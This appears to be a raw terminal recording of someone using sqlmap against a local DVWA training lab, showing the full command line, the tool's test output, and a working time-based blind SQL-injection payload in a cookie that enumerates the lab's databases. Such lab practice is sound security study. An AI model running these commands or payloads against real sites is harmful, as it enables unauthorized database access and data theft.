@@ -1,0 +1,198 @@
+Script started on 2020-08-31 01:11:38+05:30 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="135" LINES="34"]
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/SQL_Injection_Blind[01;31mdinesh@evil[00m: [[01;34mSQL_Injection_Blind[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/SQL_Injection_Blind[01;31mdinesh@evil[00m: [[01;34mSQL_Injection_Blind[00m] $ ssh dinesh@10.10.10.8[13Pzaproxy [13@sudo shutdown -h now[Cll[Kcd ../SQL_Injection_Blind/[Kless hex_exec_cmd.php [4@./convert.sh [C[C[C[C[C[C[C[C[C[C[C[C[Ccat exec_cmd.php  | tr '\n' ' ' | sed 's/ \+/ /g'[K | sed 's/ \+/ /g'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[23P./convert.sh exec_cmd.php [4Pless hex_[C[C[C[C[C[C[C[C[C[C[C[C[Ccd ..[K/SQL_Injection_Blind/ll[Ksudo shutdown -h now [13Pzaproxy[Cssh dinesh@10.10.10.8[Ksqlmap -u 'http://dvwa.local/vulnerabilities/sqli_blind/' --cookie='id=*; PHPSESSID=jh3c0eqqu03mlcvjh1ddjj1spr; security=high' -p 'id' --param-filter='COOKIE' --skip='PHPSESSID,security' --flush-session --fresh-queries --proxy='https://localhost:7777'  --dbs --dbms='mysql' --os='linux' --text-only --ignore-code=404 --level=3 --output-dr[Kit [K[Kr ./sc[Kqlmapdir/[C[C[C[1P./sqlmapdir/=./sqlmapdir/[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/SQL_Injection_Blind[01;31mdinesh@evil[00m: [[01;34mSQL_Injection_Blind[00m] $ sqlmap -u 'http://dvwa.local/vulnerabilities/sqli_blind/' --cookie='id=*; PHPSESSID=jh3c0eqqu03mlcvjh1ddjj1spr; security=high' -p 'id' --param-filter='COOKIE' --skip='PHPSESSID,security' --flush-session --fresh-queries --proxy='https://localhost:7777'  --dbs --dbms='mysql' --os='linux' --text-only --ignore-code=404 --level=3 --output-dir=./sqlmapdir/
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m"[01;49m]_____ ___ ___  [01;37m{[01;90m1.4.8#stable[01;37m}[01;33m
+|_ -| . [[01;41m.[01;49m]     | .'| . |
+|___|_  [[01;41m'[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 01:12:52 /2020-08-31/
+
+[[36m01:12:52[0m] [[33mWARNING[0m] using '[37m/home/dinesh/Documents/work/workspaces/git_temp_projs/dvwa/SQL_Injection_Blind/sqlmapdir[0m' as the output directory
+[[36m01:12:52[0m] [[33mWARNING[0m] you've provided target URL without any GET parameters (e.g. '[37mhttp://www.site.com/article.php?id=1[0m') and without providing any POST parameters through option '[37m--data[0m'
+[1mdo you want to try URI injections in the target URL itself? [Y/n/q] [0mn
+[1mcustom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] [0mn
+[[36m01:13:19[0m] [[32mINFO[0m] flushing session file
+[[36m01:13:19[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+[[36m01:13:19[0m] [[32mINFO[0m] testing if the target URL content is stable
+[[36m01:13:20[0m] [[32mINFO[0m] target URL content is stable
+[1mdo you want to URL encode cookie values (implementation specific)? [Y/n] [0mY
+[[36m01:13:38[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that Cookie parameter '[37mid[0m[1m' might not be injectable[0m
+[[36m01:13:39[0m] [[32mINFO[0m] testing for SQL injection on Cookie parameter '[37mid[0m'
+[[36m01:13:39[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m01:13:45[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause (subquery - comment)[0m'
+[[36m01:14:00[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause (comment)[0m'
+[[36m01:14:03[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m01:14:03[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (DUAL)[0m'
+[[36m01:14:03[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (DUAL - original value)[0m'
+[[36m01:14:03[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (CASE)[0m'
+[[36m01:14:03[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (CASE - original value)[0m'
+[[36m01:14:03[0m] [[32mINFO[0m] testing '[37mHAVING boolean-based blind - WHERE, GROUP BY clause[0m'
+[[36m01:14:16[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m01:14:16[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause (MySQL comment)[0m'
+[[36m01:14:16[0m] [[32mINFO[0m] testing '[37mMySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause[0m'
+[[36m01:14:19[0m] [[32mINFO[0m] testing '[37mMySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)[0m'
+[[36m01:14:22[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause[0m'
+[[36m01:14:22[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)[0m'
+[[36m01:14:24[0m] [[32mINFO[0m] testing '[37mMySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause[0m'
+[[36m01:14:24[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m01:14:39[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)[0m'
+[[36m01:14:51[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)[0m'
+[[36m01:15:10[0m] [[32mINFO[0m] testing '[37mMySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m01:15:16[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)[0m'
+[[36m01:15:27[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m01:15:27[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)[0m'
+[[36m01:15:27[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)[0m'
+[[36m01:15:30[0m] [[32mINFO[0m] testing '[37mMySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)[0m'
+[[36m01:15:30[0m] [[32mINFO[0m] testing '[37mMySQL inline queries[0m'
+[[36m01:15:30[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 stacked queries (comment)[0m'
+[[36m01:15:30[0m] [[41;37mCRITICAL[0m] considerable lagging has been detected in connection response(s). Please use as high value for option '[37m--time-sec[0m' as possible (e.g. 10 or more)
+[[36m01:15:39[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 stacked queries[0m'
+[[36m01:15:49[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 stacked queries (query SLEEP - comment)[0m'
+[[36m01:15:56[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m01:16:23[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (SLEEP)[0m'
+[[36m01:16:39[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (SLEEP - comment)[0m'
+[[36m01:16:51[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)[0m'
+[[36m01:17:14[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 RLIKE time-based blind[0m'
+^C[[36m01:17:19[0m] [[33mWARNING[0m] user aborted during detection phase
+[1mhow do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(c)hange verbosity/(q)uit] [0m
+[[36m01:17:23[0m] [[33mWARNING[0m] HTTP error codes detected during run:
+404 (Not Found) - 370 times
+[[36m01:17:23[0m] [[31mERROR[0m] user quit
+
+[*] ending @ 01:17:23 /2020-08-31/
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/SQL_Injection_Blind[01;31mdinesh@evil[00m: [[01;34mSQL_Injection_Blind[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/SQL_Injection_Blind[01;31mdinesh@evil[00m: [[01;34mSQL_Injection_Blind[00m] $ sqlmap -u 'http://dvwa.local/vulnerabilities/sqli_blind/' --cookie='id=*; PHPSESSID=jh3c0eqqu03mlcvjh1ddjj1spr; security=high' -p 'id' --param-filter='COOKIE' --skip='PHPSESSID,security' --flush-session --fresh-queries --proxy='https://localhost:7777'  --dbs --dbms='mysql' --os='linux' --text-only --ignore-code=404 --level=3 --output-dir=./sqlmapdir/[1P --output-dir=./sqlmapdir/[1P --output-dir=./sqlmapdir/[1P --output-dir=./sqlmapdir/[1P --output-dir=./sqlmapdir/[1P --output-dir=./sqlmapdir/[1P --output-dir=./sqlmapdir/[1P --output-dir=./sqlmapdir/[1P --output-dir=./sqlmapdir/[1P --output-dir=./sqlmapdir/[1P--output-dir=./sqlmapdir/[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[A[A
+
+
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m'[01;49m]_____ ___ ___  [01;37m{[01;90m1.4.8#stable[01;37m}[01;33m
+|_ -| . [[01;41m)[01;49m]     | .'| . |
+|___|_  [[01;41m,[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 01:17:45 /2020-08-31/
+
+[[36m01:17:45[0m] [[33mWARNING[0m] using '[37m/home/dinesh/Documents/work/workspaces/git_temp_projs/dvwa/SQL_Injection_Blind/sqlmapdir[0m' as the output directory
+[[36m01:17:45[0m] [[33mWARNING[0m] you've provided target URL without any GET parameters (e.g. '[37mhttp://www.site.com/article.php?id=1[0m') and without providing any POST parameters through option '[37m--data[0m'
+[1mdo you want to try URI injections in the target URL itself? [Y/n/q] [0mn
+[1mcustom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] [0mn
+[[36m01:18:03[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+[[36m01:18:03[0m] [[32mINFO[0m] testing if the target URL content is stable
+[[36m01:18:04[0m] [[32mINFO[0m] target URL content is stable
+[[36m01:18:04[0m] [[41;37mCRITICAL[0m] no parameter(s) found for testing in the provided data (e.g. GET parameter '[37mid[0m' in '[37mwww.site.com/index.php?id=1[0m'). You are advised to rerun with '[37m--crawl=2[0m'
+[[36m01:18:04[0m] [[33mWARNING[0m] HTTP error codes detected during run:
+404 (Not Found) - 2 times
+
+[*] ending @ 01:18:04 /2020-08-31/
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/SQL_Injection_Blind[01;31mdinesh@evil[00m: [[01;34mSQL_Injection_Blind[00m] $ sqlmap -u 'http://dvwa.local/vulnerabilities/sqli_blind/' --cookie='id=*; PHPSESSID=jh3c0eqqu03mlcvjh1ddjj1spr; security=high' -p 'id' --param-filter='COOKIE' --skip='PHPSESSID,security' --flush-session --fresh-queries --proxy='https://localhost:7777'  --dbs --dbms='mysql' --os='linux' --ignore-code=404 --output-dir=./sqlmapdir/ --level=3[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/SQL_Injection_Blind[01;31mdinesh@evil[00m: [[01;34mSQL_Injection_Blind[00m] $ sqlmap -u 'http://dvwa.local/vulnerabilities/sqli_blind/' --cookie='id=*; PHPSESSID=jh3c0eqqu03mlcvjh1ddjj1spr; security=high' -p 'id' --param-filter='COOKIE' --skip='PHPSESSID,security' --flush-session --fresh-queries --proxy='https://localhost:7777'  --dbs --dbms='mysql' --os='linux' --ignore-code=404 --output-dir=./sqlmapdir/ --level=3
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m'[01;49m]_____ ___ ___  [01;37m{[01;90m1.4.8#stable[01;37m}[01;33m
+|_ -| . [[01;41m'[01;49m]     | .'| . |
+|___|_  [[01;41m([01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 01:18:32 /2020-08-31/
+
+[[36m01:18:32[0m] [[33mWARNING[0m] using '[37m/home/dinesh/Documents/work/workspaces/git_temp_projs/dvwa/SQL_Injection_Blind/sqlmapdir[0m' as the output directory
+[[36m01:18:32[0m] [[33mWARNING[0m] you've provided target URL without any GET parameters (e.g. '[37mhttp://www.site.com/article.php?id=1[0m') and without providing any POST parameters through option '[37m--data[0m'
+[1mdo you want to try URI injections in the target URL itself? [Y/n/q] [0m
+[[36m01:18:33[0m] [[31mERROR[0m] user quit
+
+[*] ending @ 01:18:33 /2020-08-31/
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/SQL_Injection_Blind[01;31mdinesh@evil[00m: [[01;34mSQL_Injection_Blind[00m] $ sqlmap -u 'http://dvwa.local/vulnerabilities/sqli_blind/' --cookie='id=*; PHPSESSID=jh3c0eqqu03mlcvjh1ddjj1spr; security=high' -p 'id' --param-filter='COOKIE' --skip='PHPSESSID,security' --flush-session --fresh-queries --proxy='https://localhost:7777'  --dbs --dbms='mysql' --os='linux' --ignore-code=404 --output-dir=./sqlmapdir/ --level=3[K2[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/SQL_Injection_Blind[01;31mdinesh@evil[00m: [[01;34mSQL_Injection_Blind[00m] $ sqlmap -u 'http://dvwa.local/vulnerabilities/sqli_blind/' --cookie='id=*; PHPSESSID=jh3c0eqqu03mlcvjh1ddjj1spr; security=high' -p 'id' --param-filter='COOKIE' --skip='PHPSESSID,security' --flush-session --fresh-queries --proxy='https://localhost:7777'  --dbs --dbms='mysql' --os='linux' --ignore-code=404 --output-dir=./sqlmapdir/ --level=2
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m'[01;49m]_____ ___ ___  [01;37m{[01;90m1.4.8#stable[01;37m}[01;33m
+|_ -| . [[01;41m,[01;49m]     | .'| . |
+|___|_  [[01;41m"[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 01:18:36 /2020-08-31/
+
+[[36m01:18:36[0m] [[33mWARNING[0m] using '[37m/home/dinesh/Documents/work/workspaces/git_temp_projs/dvwa/SQL_Injection_Blind/sqlmapdir[0m' as the output directory
+[[36m01:18:36[0m] [[33mWARNING[0m] you've provided target URL without any GET parameters (e.g. '[37mhttp://www.site.com/article.php?id=1[0m') and without providing any POST parameters through option '[37m--data[0m'
+[1mdo you want to try URI injections in the target URL itself? [Y/n/q] [0mn
+[1mcustom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] [0mn
+[[36m01:18:39[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+[[36m01:18:40[0m] [[32mINFO[0m] testing if the target URL content is stable
+[[36m01:18:43[0m] [[32mINFO[0m] target URL content is stable
+[1mdo you want to URL encode cookie values (implementation specific)? [Y/n] [0my
+[[36m01:19:01[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that Cookie parameter '[37mid[0m[1m' might not be injectable[0m
+[[36m01:19:02[0m] [[32mINFO[0m] testing for SQL injection on Cookie parameter '[37mid[0m'
+[[36m01:19:02[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m01:19:07[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause (subquery - comment)[0m'
+[[36m01:19:08[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause (comment)[0m'
+[[36m01:19:15[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m01:19:17[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (DUAL)[0m'
+[[36m01:19:17[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (CASE)[0m'
+[[36m01:19:17[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m01:19:17[0m] [[32mINFO[0m] testing '[37mMySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause[0m'
+[[36m01:19:22[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause[0m'
+[[36m01:19:24[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m01:19:26[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)[0m'
+[[36m01:19:31[0m] [[32mINFO[0m] testing '[37mMySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m01:19:32[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)[0m'
+[[36m01:19:47[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m01:19:47[0m] [[32mINFO[0m] testing '[37mMySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)[0m'
+[[36m01:19:50[0m] [[32mINFO[0m] testing '[37mMySQL inline queries[0m'
+[[36m01:19:52[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 stacked queries (comment)[0m'
+[[36m01:19:52[0m] [[41;37mCRITICAL[0m] considerable lagging has been detected in connection response(s). Please use as high value for option '[37m--time-sec[0m' as possible (e.g. 10 or more)
+[[36m01:19:54[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m01:20:23[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (SLEEP)[0m'
+[[36m01:20:33[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 RLIKE time-based blind[0m'
+[[36m01:21:28[0m][1m [[32;1mINFO[0m][1m Cookie parameter '[37mid[0m[1m' appears to be '[37mMySQL >= 5.0.12 RLIKE time-based blind[0m[1m' injectable [0m
+[1mfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (1) values? [Y/n] [0mn
+[[36m01:23:42[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 20 columns[0m'
+[[36m01:23:42[0m] [[32mINFO[0m] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[[36m01:23:47[0m] [[32mINFO[0m] target URL appears to be UNION injectable with 2 columns
+[1minjection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] [0mn
+[[36m01:24:08[0m] [[33mWARNING[0m] if UNION based SQL injection is not detected, please consider usage of option '[37m--union-char[0m' (e.g. '[37m--union-char=1[0m') 
+[[36m01:24:08[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 21 to 40 columns[0m'
+[[36m01:24:10[0m] [[32mINFO[0m] testing '[37mMySQL UNION query (NULL) - 1 to 20 columns[0m'
+[1minjection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] [0my
+[[36m01:24:27[0m] [[32mINFO[0m] testing '[37mMySQL UNION query (65) - 21 to 40 columns[0m'
+[[36m01:24:36[0m] [[32mINFO[0m] checking if the injection point on Cookie parameter '[37mid[0m' is a false positive
+[1mCookie parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] [0mn
+sqlmap identified the following injection point(s) with a total of 262 HTTP(s) requests:
+---
+Parameter: id (Cookie)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 RLIKE time-based blind
+    Payload: id=*'[37m RLIKE SLEEP(5) AND [0m'EZrr'='EZrr; PHPSESSID=jh3c0eqqu03mlcvjh1ddjj1spr; security=high
+---
+[[36m01:50:27[0m][1m [[32;1mINFO[0m][1m the back-end DBMS is MySQL[0m
+[[36m01:50:27[0m] [[33mWARNING[0m] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+back-end DBMS: MySQL >= 5.0.12 ([37mMariaDB [0mfork)
+[[36m01:50:52[0m] [[32mINFO[0m] fetching database names
+[[36m01:50:52[0m] [[32mINFO[0m] fetching number of databases
+[[36m01:50:52[0m] [[32mINFO[0m] retrieved: 2
+[[36m01:51:42[0m] [[32mINFO[0m] retrieved: information_schema
+[[36m02:16:58[0m] [[32mINFO[0m] retrieved: dvwa
+available databases [2]:
+[*] dvwa
+[*] information_schema
+
+[[36m02:22:32[0m] [[33mWARNING[0m] HTTP error codes detected during run:
+404 (Not Found) - 414 times
+[[36m02:22:32[0m] [[32mINFO[0m] fetched data logged to text files under '[37m/home/dinesh/Documents/work/workspaces/git_temp_projs/dvwa/SQL_Injection_Blind/sqlmapdir/dvwa.local[0m'
+
+[*] ending @ 02:22:32 /2020-08-31/
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/SQL_Injection_Blind[01;31mdinesh@evil[00m: [[01;34mSQL_Injection_Blind[00m] $ ^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/SQL_Injection_Blind[01;31mdinesh@evil[00m: [[01;34mSQL_Injection_Blind[00m] $ exit
+
+Script done on 2020-08-31 02:38:01+05:30 [COMMAND_EXIT_CODE="130"]
